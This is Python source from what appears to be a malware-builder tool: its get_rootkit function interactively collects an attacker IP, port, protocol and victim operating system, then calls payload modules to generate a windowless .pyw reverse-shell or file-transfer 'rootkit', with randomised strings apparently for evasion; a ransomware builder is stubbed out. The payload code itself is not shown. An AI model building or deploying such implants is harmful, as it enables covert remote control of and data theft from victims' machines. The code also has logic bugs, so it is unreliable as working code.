def get_rootkit():
    import os, sys, socket, random, string
    from os import path
    from socket import gethostname
    PATH = path.dirname(path.dirname(__file__))
    sys.path.insert(0, PATH) 
    from core.core import Color, create_file, notify
    
    T_PATH = PATH + "\\Builded\\Rootkit\\"
    black, red, green, yellow, blue, magenta, cyan, grey, reset = Color().GetAllColors()
    print("Please Choose Rootkit Type:\n"
          + red + "{1}--> Reverse Shell\n"
          + green + '{2}--> File Transfer (+ Reverse Shell)\n' + reset)
    r_type = str(input("..> "))
    print(
        "A " + red + "RootKit" + reset + " ?"
        + "What is The Connection Type : \n"
        + red + "{1}--> TCP\n"
        + green + "{2}--> UDP\n"
        + blue + "{000}--> Back To Main Menu" + reset
    )
    CHOICE = str(input("..> "))
    print(CHOICE)
    if "1" == CHOICE:
        CHOICE = "TCP"
    elif "2" == CHOICE:
        CHOICE = "UDP"
    else:
        print("{} is not a valid choice".format(CHOICE))

    if CHOICE == "000":
        pass

    elif CHOICE == "TCP" or CHOICE == "UDP":
        # Getting Some Required Information : PATH Of Rootkit , Attacker_Ip : Ip or Domain to Send data to it
        # Attacker_Port : An open port on attacker machine

        # Getting File PATH
        notify("question",
               "Enter A Name For Your File .\nIt Will Be --> "
               "{}YOUR_FILE_NAME.pyw : ".format(T_PATH),
               ending="",
               )
        UPATH = str(input(""))
        UPATH = T_PATH + UPATH +".pyw"

        notify("report",
               "Using {} As File Path".format(UPATH))
        # Very important
        notify("question",
               "Whats Your Victim(s) Operating System(s)" + red +
               " {W}indows" + green + " {L}inux" + reset

               )
        VICTIM_OS = str(input("..> ")).upper()

        if VICTIM_OS == "000":
            pass

        elif VICTIM_OS in ["W", "L"]:
            VICTIM_OS = VICTIM_OS.replace("W", "WINDOWS", -1)
            VICTIM_OS = VICTIM_OS.replace("L", "LINUX", -1)
            # Getting Attacker ip
            notify(
                "question", "Whats You IP Address " +
                "Host Name Or Domain Name " +
                "Left it to empty to use your own hostname (automic) : ",
                ending="",
            )
            ATTACKER_IP = str(input(""))
            if ATTACKER_IP == "":
                ATTACKER_IP = gethostname()
            # For confirmation
            notify("report",
                "Using IP {} As Attacker_ip".format(ATTACKER_IP)
            )
            # Getting an open port on attacker port

            notify(
                "question",
                "Whats An Open Port In Your Machine "
                "Left It (Press Enter) To Use Default Port (1534 Eclipse's default communicate port) : ",
                ending="",
            )
            ATTACKER_PORT = input("")
            if ATTACKER_PORT == "":
                ATTACKER_PORT = 1534
            elif not isinstance(ATTACKER_PORT, int):
                ATTACKER_PORT = int(ATTACKER_PORT)
            notify("report",
                "Using port {} As Attacker_ip".format(ATTACKER_PORT)
            )
            strs = []
            c= string.ascii_lowercase + string.ascii_uppercase
            for i in range(3):
                strs.append(''.join(random.choice(c) for i in range(1 , 4)))
            if r_type == '1':
             if CHOICE == 'TCP':
                import core.payloads._rootkit.reverse_tcp as r
                rootkit = r._get_rootkit(ATTACKER_IP,ATTACKER_PORT,VICTIM_OS, strs)
             elif CHOICE == 'UDP':
                import core.payloads._rootkit.reverse_udp as r
                rootkit = r._get_rootkit(ATTACKER_IP,ATTACKER_PORT,VICTIM_OS, strs)
            elif r_type == '2':
                if CHOICE == 'TCP':
                    import core.payloads._rootkit.ft_tcp as r
                    rootkit = r._get_rootkit(ATTACKER_IP,ATTACKER_PORT,VICTIM_OS, strs)
                elif CHOICE == 'UDP':
                    import core.payloads._rootkit.ft_udp as r
                    rootkit = r._get_rootkit(ATTACKER_IP,ATTACKER_PORT,VICTIM_OS, strs)


            else:
                # Bad OS
                notify(
                    "problem",
                    "Invalid OS [-- {} --]".format(VICTIM_OS)
                )
            UPATH = create_file(UPATH)
            return rootkit, UPATH
    else:
        print("Port is either TCP or UDP but yours is not one.try again")


def get_ransomware():
    pass
